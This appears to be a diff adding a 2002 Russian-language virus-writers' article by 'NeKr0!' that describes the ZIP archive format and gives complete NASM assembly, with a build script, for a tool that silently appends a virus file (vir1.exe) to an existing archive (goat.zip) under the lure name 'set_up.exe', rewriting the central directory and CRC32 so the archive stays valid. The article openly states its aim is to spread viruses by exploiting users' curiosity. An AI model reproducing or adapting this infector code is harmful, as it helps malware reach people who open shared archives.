@@ -1,0 +1,334 @@
+
+▐█ █▐▀█▄▐▀█ ▀▐▀▀▌▀█▄▐▀▀▌    ▄▄▄█▀█
+ █ █▐  █▐▄█▌█▐  ▄  █▐       █▄▄▄▄    ▄      Жизнь в ZIP'е
+ █▄█▐▄▄█▐  █▐▐  █▄▄█▐       ▀   ▀█  
+▐█ █▐▄ █▐▄██▐▐▄ █▄ █▐▄      ▀█▄▄█▀   ▀      (c) NeKr0!
+==============================================================================
+
+   Хай опять. Решил я реализовать одну идейку, правда идейка эта далеко не
+нова :) , но реализация моя ;). Как на данный момент вирусу размножаться?
+Ведь сейчас EXE'шниками не обмениваются, больно велики они стали, а меняются
+архивами, т.к. они меньше занимают (для тех кто не знал :). А что в архиве -
+хоть вордовские документы, хоть инсталлянты - нам без разницы, т.к. мы туда
+свой инсталлянт будем закидывать. Понадеемся на любознательность юзера, обна-
+ружевшего при разархивации файлик set_up.exe. Т.к. свой архиватор мы писать
+наверное не будем, то будем добавлять файл в архив без сжатия (метод stored).
+   Вы может спросите - А почему ZIP? Ведь RAR лучше сжимает. Ну может и лучше,
+но ZIP - стандарт среди архиваторов и наиболее распространен в сети. (А RAR и
+ZIP формат поддерживает).
+   И так, как же устроен архив типа ZIP ? Нихрена не просто он устроен :)
+А примерно так:
+ _______________________________
+[_       Заголовок файла1      _] <------- Заголовок файла, идущего следом
+[_              Файл1          _] <------- Сжатый/несжатый файл
+[_       Заголовок файла2      _]          Заголовок --//--//--//
+[__________     Файл2   ________]          --//--//--// файл
+[         Запись о файле1       ] <----,-- Центральная директория
+[_________Запись о файле2_______] <---/
+[Запись о Центральной Директории]          Итог всему
+   
+   Теперь подробнее (а кому надо еще подробнее - описание формата в архиве)
+   Заголовок файла: содержит инфу о том какой ферсией архиватора его сжимали,
+размер упакованного файла, размер не упакованного файла, CRC32 файла, время
+файла, дата, длину имени файла и собственно само имя.
+   Файл: собственно наш файл, один в один.
+   Запись о файле: почти полностью повторяет заголовок файла, но есть несколько
+дополнительных полей, как то: версия архиватора для распаковки, номер диска
+(для многотомных архивов), внутренние аттрибуты файла (текст/код), внешние
+аттрибуты (read-only, etc...), смещение заголовка файла в архиве.
+   Центральная Директория: набор из записей о файле
+   Запись о Цетральной директории: номер диска, номер диска с Центральной
+директорией, кол-во инфо о файлах в ЦД на этом диске, кол-во инфо о файлах
+всего в ЦД, размер ЦД, смещение ЦД в архиве.
+   Вот такой навороченный формат :) Будем в него внедряться. Для этого нужно:
+1 Сохранить ЦД и запись о ЦД в памяти
+2 Получить длину файла, его CRC32
+3 Записать на место ЦД заголовок файла с нашими значениями
+4 Приписать туда же сам файл
+5 Приписать ЦД
+6 Приписать наш новый элемент ЦД (указав в нем смещение заголовка)
+7 Подправить Запись о ЦД исходя из наших изменений
+8 Ну и записать ее.....
+
+   Ниже вы увидите реализацию этого всего. Прога берет файл vir1.exe и добав-
+ляет его в архив goat.zip под именем set_up.exe . Никаких проверок не произ-
+водится. Прога писанна на NASMe, BATник для компиляции тоже присутствует :
+
+===========[compile.bat]====================================================
+nasmw -o zipadd.obj -f win32 zipadd.asm 
+alink zipadd.obj -entry start -oPE win32.lib -subsys gui
+===========[compile.bat]====================================================
+
+===========[zipadd.asm]=====================================================
+;(c) 2002 by NeKr0! 		;Одна из самых важных комманд ;)
+BITS 32				;Используем типа 32 битные регистры ;)
+ %macro callx 1			;Макроопределение вызова API
+  extern %1
+  call %1
+ %endmacro
+
+section .data			;Секция данных
+
+zip_head:			;Заголовок зипованного файла 
+_magic		db 'PK',03, 04  ;Метка
+_ver_extr	dw 14h		;Версия ZIP для извлечения
+_gen_purp	dw 0		;Флаги архива
+_compress_met	dw 0		;Метод сжатия
+_file_time	dw 0A71Ch	;Время
+_file_date	dw 2764h	;Дата
+_crc32		dd 0		;црц32 :)
+_comp_size	dd 0		;Размер пакованного файла
+_uncomp_size	dd 0		;и не пакованного
+_fname_len	dw nam_len	;Длина имени файла
+_extr_field	dw 0		;Размер доп. поля
+_fname		db 'set_up.exe' ;Имя файла ? ;)
+nam_len equ $- _fname
+zip_head_len equ $-zip_head
+
+file_head:			;Запись о файле в директории
+_magic2		db 'PK', 01, 02 ;Другая метка
+_ver_made	dw 14h		;Чем паковали
+_ver_extr2	dw 14h		;Чем распаковывать
+_bit_flag	dw 0		;Флаги
+_comp_metod	dw 0		;Метод сжатия
+_f_time		dw 0A71Ch	;Дата
+_f_date		dw 2764h	;Время
+_crc32_2	dd 0		;Опять црц32
+_size_comp	dd 0		;Размер жатого
+_size_uncomp	dd 0		;и не жатого
+_len_fname	dw nam_len	;Длина имени файла
+_len_extr	dw 0		;Длина доп. поля
+_len_comment	dw 0		;Длина комментария
+_disk_numb	dw 0		;Номер диска
+_attrib_int	dw 0		;Внутреннии атрибуты
+_attrib_ext	dd 20h		;Внешние
+_loc_head_ofs	dd 0		;Смещение заголовка зип файла (zip_head)
+		db 'set_up.exe'	;Таки опять имя файла ;)
+fhead_len 	equ $-file_head
+
+_cd:				;Запись о центральной директории
+_sign		dd 0		;50 4B 05 06
+_disk_number	dw 0		;Номер этого диска (тома)
+_cd_disk_num	dw 0		;Номер диска с центральной директорией
+_entries	dw 0		;Кол-во описаний файлов в центральной дире на этом диске
+_entries2	dw 0		;и всего описаний в центральной дире
+_cd_size	dd 0		;Размер диры
+_cd_offset	dd 0		;Смещение начала диры в файле
+_comment_len	dw 0		;Длинна коментария
+
+goat_name	db 'goat.zip',0 ;Куда будем добавлять
+goat_hndl	dd 0		;Хендл архива
+goat_size	dd 0		;Размер архива
+
+readed		dd 0		;Типа переменная для всякой хрени
+f_hndl		dd 0		;Хендл файла
+f_name		db 'vir1.exe',0 ;Ну и имя его
+f_size		dd 0		;Размер файла
+in_mem		dd 0		;Адресс файла в памяти
+in_mem2		dd 0		;Адрес центральной диры в памяти
+
+section .code			;Кодовая секция
+global start			;Благополучия и Глобальности Вам :)
+start:
+	xor eax,eax		;Очень популярное сочетание операнда с регистром
+	push eax
+	push eax
+	push dword 3
+	push eax
+	push eax
+	push dword 0C0000000h
+	push dword goat_name
+	callx CreateFileA  	;Откроем архив
+	mov [goat_hndl],eax	;Сохраним хендл
+
+	xor eax,eax
+	push eax
+	push eax
+	push dword 3
+	push eax
+	push eax
+	push dword 0C0000000h
+	push dword f_name
+	callx CreateFileA  	;Откоем файло, которое будем добавлять
+	mov [f_hndl],eax	;Хендл сохраним
+
+	push dword 0
+	push dword [f_hndl]
+	callx GetFileSize 	;Узнаем размер файла
+
+	mov dword [f_size],eax	;Заполним поля в загаловках
+	mov dword [_comp_size],eax
+	mov dword [_uncomp_size],eax
+	mov dword [_size_uncomp],eax
+	mov dword [_size_comp],eax
+
+	push dword 0
+	push dword [goat_hndl]
+	callx GetFileSize	;Узнаем размер архива
+	mov dword [goat_size],eax ;Запомним размер
+
+	push dword 2
+	push dword 0
+	push dword -22
+	push dword [goat_hndl]	;Размер описания центральной диры = 22
+	callx SetFilePointer 	;Поставим указатель на конец - 22 байта
+
+	push dword 0
+	push dword readed
+	push dword 22
+	push dword _cd
+	push dword [goat_hndl]
+	callx ReadFile  	;Прочитаем описание ЦД
+
+	push dword [_cd_size]	;Размер ЦД
+	push dword 0
+	callx GlobalAlloc	;Выделим память под ЦД
+	mov dword [in_mem2],eax	;Адресс выделенной памяти
+
+	mov eax, dword [_cd_offset] ;Указатель на начало ЦД в файле
+	push eax		;Сохраним на время указатель
+	push dword 0
+	push dword 0
+	push eax
+	push dword [goat_hndl]
+	callx SetFilePointer ;Поставим файловый указатель на начало ЦД
+
+	push dword 0		;
+	push dword readed
+	push dword [_cd_size]	
+	push dword [in_mem2]	;Куда читать
+	push dword [goat_hndl]
+	callx ReadFile  	;Считаем ЦД в память
+
+	pop eax			;Восстановим указатель
+	push dword 0
+	push dword 0
+	push eax
+	push dword [goat_hndl]
+	callx SetFilePointer 	;И поставим его опять на начало ЦД
+				
+	mov dword [_loc_head_ofs],eax ;Т.к. вместо ЦД у нас тут будет лежать
+				;наш файл, вместе с заголовком, то запомним
+				;этот адресс. Здесь будет лежать файловый
+				;заголовок
+
+	push dword [f_size]	;Размер файла
+	push dword 0
+	callx GlobalAlloc	;Выделим память под него
+	mov dword [in_mem],eax	;Сохраним указатель на память
+
+	push eax		;И еще раз его сохраним
+	push dword 0
+	push dword readed
+	push dword [f_size]
+	push eax
+	push dword [f_hndl]
+	callx ReadFile  	;Считаем файл в память
+
+	pop eax			;Восстановим указатель на память
+	mov esi,eax
+	mov edi, dword [f_size] ;Размер файла
+	call CRC32		;И сосчитаем CRC32 для файла, и заполним
+	mov dword [_crc32], eax	;нужные поля в заголовках
+	mov dword [_crc32_2], eax
+
+
+	push dword 0
+	push dword readed
+	push dword zip_head_len
+	push dword zip_head
+	push dword [goat_hndl]
+	callx WriteFile		;Запишем на место бывшей ЦД заголовок
+				;нашего файла
+	push dword 0
+	push dword readed
+	push dword [f_size]
+	push dword [in_mem]
+	push dword [goat_hndl]
+	callx WriteFile		;А теперь и сам файл
+
+	push dword 0
+	push dword readed
+	push dword [_cd_size]
+	push dword [in_mem2]
+	push dword [goat_hndl]
+	callx WriteFile		;Запишем сохраненную ЦД
+
+	push dword 0
+	push dword readed
+	push dword fhead_len
+	push dword file_head
+	push dword [goat_hndl]
+	callx WriteFile		;И добавим в ЦД свое описание
+
+	inc word [_entries]	;Увеличим кол-во входов
+	inc word [_entries2]	;-//-//-//
+	mov eax, dword [f_size]	;Размер нашего файла
+	add dword [_cd_size],fhead_len ;Увеличим размер ЦД на наше описание
+	add eax, zip_head_len	;Размер заголовка + длина файла
+	add dword [_cd_offset],eax ;вот и получилось новое смещение для ЦД
+
+	push dword 0
+	push dword readed
+	push dword 22
+	push dword _cd
+	push dword [goat_hndl]
+	callx WriteFile		;Сохраним запись о ЦД
+
+	push dword [in_mem2]	;Освобождение памяти от ЦД
+	callx GlobalFree
+
+	push dword [in_mem]	;Освобождение памяти от файла
+	callx GlobalFree
+
+	push dword [f_hndl]	;Закроем файл
+	callx CloseHandle
+
+	push dword [goat_hndl]	;Закроем архив
+	callx CloseHandle
+
+	push dword 0
+	callx ExitProcess	;Отформатирум винт
+
+
+CRC32:				;Процедкра подсчета CRC
+; input:
+;       ESI - Указатель на данные
+;       EDI - Размер этих данных
+; output:
+;       EAX - CRC32 данных
+; (c) Billy Belcebu
+
+	cld
+	xor     ecx,ecx                         ; Optimized by me - 2 bytes
+	dec     ecx                             ; less
+	mov     edx,ecx
+NextByteCRC:
+	xor     eax,eax
+	xor     ebx,ebx
+	lodsb
+	xor     al,cl
+	mov     cl,ch
+	mov     ch,dl
+	mov     dl,dh
+	mov     dh,8
+NextBitCRC:
+	shr     bx,1
+	rcr     ax,1
+	jnc     NoCRC
+	xor     ax,08320h
+	xor     bx,0EDB8h
+NoCRC:  dec     dh
+	jnz     NextBitCRC
+	xor     ecx,eax
+	xor     edx,ebx
+	dec     edi                             ; Another fool byte less
+	jnz     NextByteCRC
+	not     edx
+	not     ecx
+        xchg    eax,edx                         ; Another byte less
+	rol     eax,16
+	mov     ax,cx
+	ret
+end
+===========[zipadd.asm]=====================================================
